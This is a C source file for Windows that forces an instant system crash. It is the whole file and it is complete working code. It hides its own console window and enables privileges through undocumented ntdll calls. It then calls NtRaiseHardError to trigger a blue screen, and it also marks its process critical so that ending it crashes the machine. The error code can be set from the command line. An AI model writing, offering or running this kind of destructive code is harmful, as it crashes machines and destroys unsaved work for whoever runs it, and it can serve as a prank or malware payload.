#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <conio.h>
#pragma comment(lib, "Advapi32.lib")  // 用于 OpenProcessToken, AdjustTokenPrivileges, LookupPrivilegeValueA
#pragma comment(lib, "User32.lib")    // 用于 ExitWindowsEx, ShowWindow, GetForegroundWindow

#ifndef SE_SHUTDOWN_PRIVILEGE
#define SE_SHUTDOWN_PRIVILEGE 19L
#endif
#ifndef SE_DEBUG_PRIVILEGE
#define SE_DEBUG_PRIVILEGE 20L
#endif
#define ProcessBreakOnTermination 29

// NTSTATUS NTAPI NtSetInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);


void killWindowsInstant(unsigned int errorCode)
{
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	long int(*NtSetInformationProcess)(HANDLE , int, void*, unsigned long int);
	*(FARPROC *)&NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
	{
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(SE_SHUTDOWN_PRIVILEGE, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(errorCode, 0, 0, 0, 6, &tmp2);
	}
	
	if(RtlAdjustPrivilege && NtSetInformationProcess)
	{
		unsigned char old_value;
		unsigned long int critical = 1;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(SE_DEBUG_PRIVILEGE, 1, 0, &old_value);
		NtSetInformationProcess((void *)-1, ProcessBreakOnTermination, &critical, sizeof critical);
	}

	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

void hideWindow()
{
	HWND hwnd = GetForegroundWindow();
	if(hwnd)ShowWindow(hwnd,SW_HIDE);
}

int main(int argc,char **argv)
{
	int errorCode=0x114514;
	if(argc>=2) {
		sscanf_s(argv[1],"%i",&errorCode);
	}
	else {
		errorCode=0xDEADDEAD;
    	hideWindow();
	}
	// printf("%d %x\n",argc,errorCode);
	//_getch();
	killWindowsInstant(errorCode);
}